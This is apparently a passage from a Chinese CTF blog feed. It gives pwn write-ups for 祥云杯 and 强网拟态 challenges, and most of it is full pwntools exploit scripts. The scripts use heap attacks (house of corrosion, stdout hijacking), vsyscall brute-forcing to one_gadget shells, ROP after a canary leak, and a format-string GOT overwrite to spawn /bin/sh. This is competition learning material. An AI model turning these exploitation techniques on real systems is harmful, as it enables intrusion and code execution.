orw)</span><br><span class="line"></span><br><span class="line">pld = <span class="string">b&#x27;0&#x27;</span> * <span class="number">0xa0</span> * <span class="number">8</span></span><br><span class="line">pld += to_bin(heap_base + <span class="number">0x4a0</span>)</span><br><span class="line">pld += to_bin(p_rdi_r + <span class="number">1</span>)</span><br><span class="line">edit(<span class="number">6</span>, pld)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="leak"><a href="#leak" class="headerlink" title="leak"></a>leak</h2><p>程序在开始的时候将flag的内容写进了一个堆块中，所以我们只需要打印出堆块的内容即可，但是我们发现没有打印的功能，所以想到通过stdout来泄露，但是程序只有write这个函数，没有初始化IO结构体，所以需要我们自己构造，具体来说就是设置stdout的<code>flags</code>为<code>0xfbad1800</code>，设置<code>_IO_write_base</code>为打印内容的起始地址，<code>_IO_write_end</code>为打印内容的结束地址。所以问题就来到了怎么在任意地址写一个堆地址，这里参考了网上师傅的做法，用到了<code>house of corrosion</code>这个攻击方式，也就是通过<code>unsortedbin_attack</code>修改<code>global_max_fast</code>使得<code>main_arena.fastbinsY</code>数组溢出，导致目标地址写上我们释放堆块的地址。</p>
<p>我们需要申请的堆块大小计算如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chunk_size = (delta * 2) + 0x20</span><br><span class="line">alloc_size = (delta * 2) + 0x10</span><br></pre></td></tr></table></figure>

<blockquote>
<p>参考文章：<a href="https://zhuanlan.zhihu.com/p/448880453">House of Corrosion 原理及利用 - 知乎 (zhihu.com)</a></p>
</blockquote>
<p>WP如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding = utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="number">2</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span> :</span><br><span class="line">	sh = process([<span class="string">b&quot;./ld.so&quot;</span>, <span class="string">b&quot;./pwn&quot;</span>], env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : <span class="string">b&quot;./libc.so.6&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">2</span> :</span><br><span class="line">    sh = process(<span class="string">&quot;./leak&quot;</span>)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">	sh = remote(ip, port)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./leak&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :sh.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> text, data         :sh.sendafter(text, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :sh.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> text, data         :sh.sendlineafter(text, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num                :sh.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> text               :sh.recvuntil(text)</span><br><span class="line">uu32    = <span class="keyword">lambda</span>                    :u32(sh.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>                    :u64(sh.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg      = <span class="keyword">lambda</span> s                  :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">lgl     = <span class="keyword">lambda</span> s, value           :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, value))</span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------------------------------------------------------------------------------------------#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx, size</span>):</span><br><span class="line">    sla(<span class="string">&#x27;Your choice: &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Index: &#x27;</span>, <span class="built_in">str</span>(idx))        <span class="comment"># idx &lt;= 15</span></span><br><span class="line">    sla(<span class="string">&#x27;Size: &#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, content</span>):</span><br><span class="line">    sla(<span class="string">&#x27;Your choice: &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Index: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sa(<span class="string">&#x27;Content: &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):        <span class="comment"># uaf</span></span><br><span class="line">    sla(<span class="string">&#x27;Your choice: &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Index: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="comment"># house of corrosion</span></span><br><span class="line">delta = <span class="number">0xb30</span></span><br><span class="line">alloc_size = (delta * <span class="number">2</span>) + <span class="number">0x10</span></span><br><span class="line">add(<span class="number">4</span>, alloc_size)</span><br><span class="line">add(<span class="number">5</span>, <span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x500</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x100</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x60</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    edit(<span class="number">1</span>, p64(<span class="number">0</span>) * <span class="number">2</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># tcache to stdout</span></span><br><span class="line">edit(<span class="number">1</span>, <span class="string">b&#x27;\x60\xe7&#x27;</span>)</span><br><span class="line">add(<span class="number">6</span>, <span class="number">0x100</span>)</span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x100</span>)</span><br><span class="line">edit(<span class="number">7</span>, p64(<span class="number">0</span>) * <span class="number">5</span> + p64(<span class="number">0x555555ffffff</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># global_fast_max</span></span><br><span class="line">edit(<span class="number">0</span>, p64(<span class="number">0</span>) + <span class="string">b&#x27;\x30\xf9&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x610</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># stdout._IO_write_base</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># edit stdout</span></span><br><span class="line">edit(<span class="number">7</span>, p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>) * <span class="number">3</span> + <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&#x27;Your choice: &#x27;</span>, <span class="string">b&#x27;6&#x27;</span>)</span><br><span class="line">ru(<span class="string">&#x27;flag&#x27;</span>)</span><br><span class="line">flag = <span class="string">b&#x27;flag&#123;&#x27;</span> + ru(<span class="string">&#x27;&#125;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p>除了以上的做法，还找到了看雪佬的文章，用的是<code>fastbin_reverse_into_tcache</code>这个方法，之后会进行学习。</p>
<h2 id="unexploitable"><a href="#unexploitable" class="headerlink" title="unexploitable"></a>unexploitable</h2><p>只有read，并且程序在进入read之前又封装了一层函数，导致我们不能直接覆盖掉<code>__libc_start_main+243</code>这个返回地址，所以思考怎么跳过一段栈空间，只要在ret后再进行一次写入即可。同时在网上看到利用vsyscall，控制程序滑到libc附近。除以上以外，这题的爆破脚本也值得学习，怎样更好地爆破？</p>
<p>方法一，WP如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding = utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x4f2a5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rsp &amp; 0xf == 0</span></span><br><span class="line"><span class="string">  rcx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4f302 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x40] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x10a2fc execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    sh.send(p64(<span class="number">0</span>) * <span class="number">3</span> + <span class="string">b&#x27;\xd1&#x27;</span>)</span><br><span class="line">    sh.send(p64(<span class="number">0</span>) * <span class="number">3</span> + <span class="string">b&#x27;\x02\xf3\x64&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">try</span> :</span><br><span class="line">        sh = process(<span class="string">&quot;./unexploitable&quot;</span>)</span><br><span class="line">        pwn()</span><br><span class="line"></span><br><span class="line">        sh.sendline(<span class="string">&#x27;cat flag&#x27;</span>)</span><br><span class="line">        sh.recv(timeout = <span class="number">1</span>)</span><br><span class="line">        sh.sendline(<span class="string">&#x27;cat flag&#x27;</span>)</span><br><span class="line">        sh.recv(timeout = <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        sh.interactive()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt :</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> :</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>

<p>方法二，WP如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding = utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x4f2a5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rsp &amp; 0xf == 0</span></span><br><span class="line"><span class="string">  rcx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4f302 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x40] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x10a2fc execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    pld = p64(<span class="number">0</span>) * <span class="number">3</span></span><br><span class="line">    pld += p64(<span class="number">0xffffffffff600000</span>) * <span class="number">2</span></span><br><span class="line">    pld += <span class="string">b&#x27;\x02\xf3\x64&#x27;</span></span><br><span class="line">    sh.send(pld)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">try</span> :</span><br><span class="line">        sh = process(<span class="string">&quot;./unexploitable&quot;</span>)</span><br><span class="line">        pwn()</span><br><span class="line"></span><br><span class="line">        sh.sendline(<span class="string">&#x27;cat flag&#x27;</span>)</span><br><span class="line">        sh.recv(timeout = <span class="number">1</span>)</span><br><span class="line">        sh.sendline(<span class="string">&#x27;cat flag&#x27;</span>)</span><br><span class="line">        sh.recv(timeout = <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        sh.interactive()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt :</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> :</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>祥云杯</tag>
      </tags>
  </entry>
  <entry>
    <title>2022 强网拟态</title>
    <url>/2022/11/20/CTF/2022%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81/</url>
    <content><![CDATA[<h2 id="MIMIC"><a href="#MIMIC" class="headerlink" title="MIMIC"></a>MIMIC</h2><h3 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h3><span id="more"></span>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding = utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="number">2</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span> :</span><br><span class="line">	sh = process([<span class="string">b&quot;./ld.so&quot;</span>, <span class="string">b&quot;./pwn&quot;</span>], env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : <span class="string">b&quot;./libc.so.6&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">2</span> :</span><br><span class="line">    sh = process(<span class="string">&quot;./pwn1&quot;</span>)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">	sh = remote(ip, port)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :sh.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> text, data         :sh.sendafter(text, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :sh.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> text, data         :sh.sendlineafter(text, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num                :sh.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> text               :sh.recvuntil(text)</span><br><span class="line">uu32    = <span class="keyword">lambda</span>                    :u32(sh.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>                    :u64(sh.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg      = <span class="keyword">lambda</span> s                  :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">lgl     = <span class="keyword">lambda</span> s, value           :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, value))</span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------------------------------------------------------------------------------------------#</span></span><br><span class="line"></span><br><span class="line">sla(<span class="string">&#x27;Welcome to mimic world,try something&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">ru(<span class="string">&#x27;You will find some tricks\n&#x27;</span>)</span><br><span class="line">code_base = <span class="built_in">int</span>(ru(<span class="string">&#x27;a94&#x27;</span>)[-<span class="number">14</span>:], <span class="number">16</span>) - <span class="number">0xa94</span></span><br><span class="line">lg(<span class="string">&#x27;code_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sl(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">ru(<span class="string">&#x27;hello\n&#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;a&#x27;</span> * <span class="number">0xc8</span>)</span><br><span class="line">ru(<span class="string">b&#x27;aaaa\n&#x27;</span>)</span><br><span class="line">canary = u64(<span class="string">b&#x27;\x00&#x27;</span> + r(<span class="number">7</span>))</span><br><span class="line">lg(<span class="string">&#x27;canary&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p_rdi_r = code_base + <span class="number">0x0000000000000c73</span></span><br><span class="line">bin_sh = code_base + <span class="number">0x202068</span></span><br><span class="line">system = code_base + <span class="number">0xa2c</span></span><br><span class="line">pld = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0xc8</span> + p64(canary) + <span class="string">b&#x27;a&#x27;</span> * <span class="number">8</span></span><br><span class="line">pld += p64(p_rdi_r) + p64(bin_sh) + p64(system)</span><br><span class="line">s(pld)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h3><p>无法用溢出做，限制了在返回地址附近的字节数。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding = utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="number">2</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span> :</span><br><span class="line">	sh = process([<span class="string">b&quot;./ld.so&quot;</span>, <span class="string">b&quot;./pwn&quot;</span>], env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : <span class="string">b&quot;./libc.so.6&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">2</span> :</span><br><span class="line">    sh = process(<span class="string">&quot;./pwn2&quot;</span>)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">	sh = remote(ip, port)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn2&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :sh.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> text, data         :sh.sendafter(text, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :sh.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> text, data         :sh.sendlineafter(text, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num                :sh.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> text               :sh.recvuntil(text)</span><br><span class="line">uu32    = <span class="keyword">lambda</span>                    :u32(sh.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>                    :u64(sh.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg      = <span class="keyword">lambda</span> s                  :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">lgl     = <span class="keyword">lambda</span> s, value           :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, value))</span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------------------------------------------------------------------------------------------#</span></span><br><span class="line"></span><br><span class="line">sla(<span class="string">&#x27;Welcome to mimic world,try something&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">ru(<span class="string">&#x27;You will find some tricks\n&#x27;</span>)</span><br><span class="line">code_base = <span class="built_in">int</span>(ru(<span class="string">&#x27;2a0&#x27;</span>)[-<span class="number">14</span>:], <span class="number">16</span>) - <span class="number">0x12A0</span></span><br><span class="line">lg(<span class="string">&#x27;code_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sl(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">ru(<span class="string">&#x27;hello\n&#x27;</span>)</span><br><span class="line">printf_got = code_base + elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">system_plt = code_base + elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">pld = fmtstr_payload(<span class="number">8</span>, &#123;printf_got : system_plt&#125;)</span><br><span class="line">s(pld)</span><br><span class="line">s(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>



<h3 id="pwn2-1"><a href="#pwn2-1" class="headerlink" title="pwn2-1"></a>pwn2-1</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding = utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="number">2</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span> :</span><br><span class="line">	sh = process([<span class="string">b&quot;./ld.so&quot;</span>, <span class="string">b&quot;./pwn&quot;</span>], env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : <span class="string">b&quot;./libc.so.6&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">2</span> :</span><br><span class="line">    sh = process(<span class="string">&quot;./pwn2-1&quot;</span>)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">	sh = remote(ip, port)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn2-1&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :sh.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> text, data         :sh.sendafter(text, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :sh.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> text, data         :sh.sendlineafter(text, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num                :sh.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> text               :sh.recvuntil(text)</span><br><span class="line">uu32    = <span class="keyword">lambda</span>                    :u32(sh.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>                    :u64(sh.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg      = <span class="keyword">lambda</span> s                  :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">lgl     = <span class="keyword">lambda</span> s, value           :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, value))</span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------------------------------------------------------------------------------------------#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content</span>):</span><br><span class="line">    sla(<span class="string">&#x27;Your choice :&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Note size :&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span class="string">&#x27;Content :&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">&#x27;Your choice :&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Index :&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">&#x27;Your choice :&#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Index :&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&#x27;Your choice :&#x27;</span>, <span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">ru(<span class="string">&#x27;let us give you some tips\n&#x27;</span>)</span><br><span class="line">code_base = <span class="built_in">int</span>(ru(<span class="string">&#x27;1f0&#x27;</span>)[-<span class="number">14</span>:], <span class="number">16</span>) - <span class="number">0x11F0</span></span><br><span class="line">lg(<span class="string">&#x27;code_base&#x27;</span>)</span><br><span class="line">magic = code_base + <span class="number">0x1B70</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">b&#x27;pursue&#x27;</span>)    <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">b&#x27;pursue&#x27;</span>)    <span class="comment"># 1</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x10</span>, p64(magic))</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="bfbf"><a href="#bfbf" class="headerlink" title="bfbf"></a>bfbf</h3><p>程序开启了沙盒，read的fd不能超过1，之前也做到过，只要把0这个fd关闭就行。</p>
<p>WP如下，需要多跑几下才能出结果：</p>
